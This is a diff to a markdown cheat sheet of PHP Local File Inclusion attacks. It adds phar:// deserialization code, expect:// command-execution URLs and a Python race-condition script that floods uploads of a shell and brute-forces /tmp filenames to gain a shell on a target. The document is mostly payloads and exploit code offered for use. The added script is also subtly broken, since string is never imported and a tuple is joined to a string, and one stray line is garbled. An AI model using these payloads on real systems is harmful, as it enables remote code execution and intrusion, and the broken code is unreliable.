@@ -12,9 +12,11 @@ The File Inclusion vulnerability allows an attacker to include a file, usually e
   * [Wrapper data://](#wrapper-data)
   * [Wrapper expect://](#wrapper-expect)
   * [Wrapper input://](#wrapper-input)
+  * [Wrapper phar://](#wrapper-phar)
 * [LFI to RCE via /proc/*/fd](#lfi-to-rce-via-procfd)
 * [LFI to RCE via /proc/self/environ](#lfi-to-rce-via-procselfenviron)
 * [LFI to RCE via upload](#lfi-to-rce-via-upload)
+* [LFI to RCE via upload (race)](#lfi-to-rce-via-upload-race)
 * [LFI to RCE via phpinfo()](#lfi-to-rce-via-phpinfo)
 * [LFI to RCE via controlled log file](#lfi-to-rce-via-controlled-log-file)
 * [LFI to RCE via PHP sessions](#lfi-to-rce-via-php-sessions)
@@ -172,8 +174,8 @@ Fun fact: you can trigger an XSS and bypass the Chrome Auditor with : `http://ex
 ### Wrapper expect://
 
 ```powershell
-http://example.com/index.php?page=php:expect://id
-http://example.com/index.php?page=php:expect://ls
+http://example.com/index.php?page=expect://id
+http://example.com/index.php?page=expect://ls
 ```
 
 ### Wrapper input://
@@ -184,6 +186,39 @@ Specify your payload in the POST parameters
 http://example.com/index.php?page=php://input
 POST DATA: <? system('id'); ?>
 ```
+
+### Wrapper phar://
+
+Create a phar file with a serialized object in its meta-data.
+
+```php
+// create new Phar
+$phar = new Phar('test.phar');
+$phar->startBuffering();
+$phar->addFromString('test.txt', 'text');
+$phar->setStub('<?php __HALT_COMPILER(); ? >');
+
+// add object of any class as meta data
+class AnyClass {}
+$object = new AnyClass;
+$object->data = 'rips';
+$phar->setMetadata($object);
+$phar->stopBuffering();
+```
+
+If a file operation is now performed on our existing Phar file via the phar:// wrapper, then its serialized meta data is unserialized. If this application has a class named AnyClass and it has the magic method __destruct() or __wakeup() defined, then those methods are automatically invoked
+
+```php
+class AnyClass {
+    function __destruct() {
+        echo $this->data;
+    }
+}
+// output: rips
+include('phar://test.phar');
+```
+
+NOTE: The unserialize is triggered for the phar:// wrapper in any file operation, `file_exists` and many more.
 
 ## LFI to RCE via /proc/*/fd
 
@@ -208,6 +243,38 @@ http://example.com/index.php?page=path/to/uploaded/file.png
 ```
 
 In order to keep the file readable it is best to inject into the metadata for the pictures/doc/pdf
+
+## LFI to RCE via upload (race)
+Worlds Quitest Let's Play"
+* Upload a file and trigger a self-inclusion.
+* Repeat 1 a shitload of time to:
+* increase our odds of winning the race
+* increase our guessing odds
+* Bruteforce the inclusion of /tmp/[0-9a-zA-Z]{6}
+* Enjoy our shell.
+
+```python
+import itertools
+import requests
+import sys
+
+print('[+] Trying to win the race')
+f = {'file': open('shell.php', 'rb')}
+for _ in range(4096 * 4096):
+    requests.post('http://target.com/index.php?c=index.php', f)
+
+
+print('[+] Bruteforcing the inclusion')
+for fname in itertools.combinations(string.ascii_letters + string.digits, 6):
+    url = 'http://target.com/index.php?c=/tmp/php' + fname
+    r = requests.get(url)
+    if 'load average' in r.text:  # <?php echo system('uptime');
+        print('[+] We have got a shell: ' + url)
+        sys.exit(0)
+
+print('[x] Something went wrong, please try again')
+```
+
 
 ## LFI to RCE via phpinfo()
 
@@ -267,3 +334,7 @@ login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/s
 * [Local file inclusion tricks](http://devels-playground.blogspot.fr/2007/08/local-file-inclusion-tricks.html)
 * [CVV #1: Local File Inclusion - SI9INT](https://medium.com/bugbountywriteup/cvv-1-local-file-inclusion-ebc48e0e479a)
 * [Exploiting Blind File Reads / Path Traversal Vulnerabilities on Microsoft Windows Operating Systems - @evisneffos](http://www.soffensive.com/2018/06/exploiting-blind-file-reads-path.html)
+* [Baby^H Master PHP 2017 by @orangetw](https://github.com/orangetw/My-CTF-Web-Challenges#babyh-master-php-2017)
+* [Чтение файлов => unserialize !](https://rdot.org/forum/showthread.php?t=4379)
+* [New PHP Exploitation Technique - 14 Aug 2018 by Dr. Johannes Dahse](https://blog.ripstech.com/2018/new-php-exploitation-technique/)
+* [It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It, Sam Thomas](https://github.com/s-n-t/presentations/blob/master/us-18-Thomas-It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf)
